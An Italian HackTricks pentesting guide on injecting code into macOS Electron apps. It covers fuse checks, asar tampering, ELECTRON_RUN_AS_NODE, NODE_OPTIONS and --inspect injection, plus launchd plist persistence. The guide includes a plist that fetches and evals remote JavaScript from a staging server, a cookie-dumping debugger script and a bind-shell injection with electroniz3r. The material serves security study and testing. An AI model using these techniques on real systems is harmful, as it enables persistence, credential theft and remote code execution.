# Iniezione nelle applicazioni Electron di macOS

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di base

Se non sai cos'è Electron, puoi trovare [**molte informazioni qui**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ma per ora sappi solo che Electron esegue **node**.\
E node ha alcuni **parametri** e **variabili d'ambiente** che possono essere utilizzati per **eseguire altro codice** oltre al file indicato.

### Fusibili di Electron

Queste tecniche saranno discusse successivamente, ma di recente Electron ha aggiunto diversi **flag di sicurezza per prevenirle**. Questi sono i [**Fusibili di Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) e questi sono quelli utilizzati per **prevenire** che le app Electron su macOS **carichino codice arbitrario**:

* **`RunAsNode`**: Se disabilitato, impedisce l'uso della variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** per iniettare codice.
* **`EnableNodeCliInspectArguments`**: Se disabilitato, i parametri come `--inspect`, `--inspect-brk` non verranno rispettati. Evitando così il modo di iniettare codice.
* **`EnableEmbeddedAsarIntegrityValidation`**: Se abilitato, il file **`asar`** caricato verrà **validato** da macOS. **Prevenendo** in questo modo l'**iniezione di codice** modificando il contenuto di questo file.
* **`OnlyLoadAppFromAsar`**: Se abilitato, anziché cercare di caricare nell'ordine seguente: **`app.asar`**, **`app`** e infine **`default_app.asar`**. Verificherà e utilizzerà solo app.asar, garantendo così che quando **combinato** con il fusibile **`embeddedAsarIntegrityValidation`** sia **impossibile** caricare codice non convalidato.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Se abilitato, il processo del browser utilizza il file chiamato `browser_v8_context_snapshot.bin` per il suo snapshot V8.

Un altro fusibile interessante che non impedirà l'iniezione di codice è:

* **EnableCookieEncryption**: Se abilitato, il cookie store su disco è crittografato utilizzando chiavi di crittografia a livello di sistema operativo.

### Verifica dei Fusibili di Electron

È possibile **verificare questi flag** da un'applicazione con:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifica dei Fusibili di Electron

Come indicato nella [**documentazione**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configurazione dei **Fusibili di Electron** è presente all'interno del **binario di Electron**, che contiene da qualche parte la stringa **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Nelle applicazioni macOS, questo si trova tipicamente in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
È possibile caricare questo file su [https://hexed.it/](https://hexed.it/) e cercare la stringa precedente. Dopo questa stringa, è possibile vedere in ASCII un numero "0" o "1" che indica se ogni fusibile è disabilitato o abilitato. Basta modificare il codice esadecimale (`0x30` è `0` e `0x31` è `1`) per **modificare i valori dei fusibili**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si noti che se si tenta di **sovrascrivere** il **binario del framework Electron** all'interno di un'applicazione con questi byte modificati, l'applicazione non verrà eseguita.

## RCE aggiungendo codice alle applicazioni Electron

Potrebbero esserci **file JS/HTML esterni** che un'applicazione Electron sta utilizzando, quindi un attaccante potrebbe iniettare codice in questi file la cui firma non verrà verificata ed eseguire codice arbitrario nel contesto dell'applicazione.

{% hint style="danger" %}
Tuttavia, al momento ci sono 2 limitazioni:

* È necessario il permesso **`kTCCServiceSystemPolicyAppBundles`** per modificare un'applicazione, quindi per impostazione predefinita ciò non è più possibile.
* Il file **`asap`** compilato di solito ha i fusibili **`embeddedAsarIntegrityValidation`** e **`onlyLoadAppFromAsar`** abilitati

Ciò rende più complicato (o impossibile) questo percorso di attacco.
{% endhint %}

Si noti che è possibile aggirare il requisito di **`kTCCServiceSystemPolicyAppBundles`** copiando l'applicazione in un'altra directory (come **`/tmp`**), rinominando la cartella **`app.app/Contents`** in **`app.app/NotCon`**, **modificando** il file **asar** con il vostro codice **malizioso**, rinominandolo nuovamente in **`app.app/Contents`** ed eseguendolo.

È possibile estrarre il codice dal file asar con:
```bash
npx asar extract app.asar app-decomp
```
E impacchettalo nuovamente dopo averlo modificato con:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE con `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Secondo [**la documentazione**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), se questa variabile di ambiente viene impostata, avvierà il processo come un normale processo Node.js.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se la variabile **`RunAsNode`** di fuse è disabilitata, la variabile di ambiente **`ELECTRON_RUN_AS_NODE`** verrà ignorata e ciò non funzionerà.
{% endhint %}

### Iniezione dal file Plist dell'app

Come [**proposto qui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), è possibile sfruttare questa variabile di ambiente in un plist per mantenere la persistenza:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE con `NODE_OPTIONS`

Puoi memorizzare il payload in un file diverso ed eseguirlo:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Se la fusione **`EnableNodeOptionsEnvironmentVariable`** è **disabilitata**, l'app **ignorerà** la variabile di ambiente **NODE\_OPTIONS** quando viene avviata a meno che la variabile di ambiente **`ELECTRON_RUN_AS_NODE`** sia impostata, che verrà anche **ignorata** se la fusione **`RunAsNode`** è disabilitata.

Se non si imposta **`ELECTRON_RUN_AS_NODE`**, verrà visualizzato l'**errore**: `La maggior parte delle NODE_OPTION non è supportata nelle app confezionate. Consultare la documentazione per ulteriori dettagli.`
{% endhint %}

### Iniezione dal file Plist dell'app

È possibile sfruttare questa variabile di ambiente in un file Plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE con l'ispezione

Secondo [**questo**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), se esegui un'applicazione Electron con flag come **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, verrà aperta una **porta di debug** a cui puoi connetterti (ad esempio da Chrome in `chrome://inspect`) e sarai in grado di **iniettare codice** o addirittura avviare nuovi processi.\
Ad esempio:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se il fusibile **`EnableNodeCliInspectArguments`** è disabilitato, l'app **ignorerà i parametri di node** (come `--inspect`) quando viene avviata a meno che la variabile di ambiente **`ELECTRON_RUN_AS_NODE`** sia impostata, che verrà anche **ignorata** se il fusibile **`RunAsNode`** è disabilitato.

Tuttavia, è comunque possibile utilizzare il parametro **`--remote-debugging-port=9229`** di Electron, ma il payload precedente non funzionerà per eseguire altri processi.
{% endhint %}

Utilizzando il parametro **`--remote-debugging-port=9222`** è possibile rubare alcune informazioni dall'app Electron come la **cronologia** (con comandi GET) o i **cookie** del browser (in quanto sono **decifrati** all'interno del browser e c'è un **endpoint json** che li restituirà).

Puoi imparare come fare ciò [**qui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**qui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e utilizzare lo strumento automatico [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o uno script semplice come:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**questo articolo**](https://hackerone.com/reports/1274695), il debug viene sfruttato per far sì che Chrome headless **scarichi file arbitrari in posizioni arbitrarie**.

### Iniezione dal file Plist dell'app

È possibile sfruttare questa variabile di ambiente in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypass di TCC sfruttando versioni precedenti

{% hint style="success" %}
Il demone TCC di macOS non controlla la versione eseguita dell'applicazione. Quindi, se **non riesci ad iniettare codice in un'applicazione Electron** con una delle tecniche precedenti, puoi scaricare una versione precedente dell'APP e iniettare codice in essa poiché otterrà comunque i privilegi TCC (a meno che la Trust Cache lo impedisca).
{% endhint %}

## Esecuzione di codice non JS

Le tecniche precedenti ti consentiranno di eseguire **codice JS all'interno del processo dell'applicazione Electron**. Tuttavia, ricorda che i **processi figlio vengono eseguiti con lo stesso profilo sandbox** dell'applicazione principale e **ereditano i loro permessi TCC**.\
Pertanto, se desideri sfruttare i diritti per accedere alla fotocamera o al microfono, ad esempio, puoi semplicemente **eseguire un altro binario dal processo**.

## Iniezione automatica

Lo strumento [**electroniz3r**](https://github.com/r3ggi/electroniz3r) può essere facilmente utilizzato per **trovare applicazioni Electron vulnerabili** installate e iniettare codice in esse. Questo strumento cercherà di utilizzare la tecnica **`--inspect`**:

Devi compilarlo da solo e puoi usarlo in questo modo:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Riferimenti

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
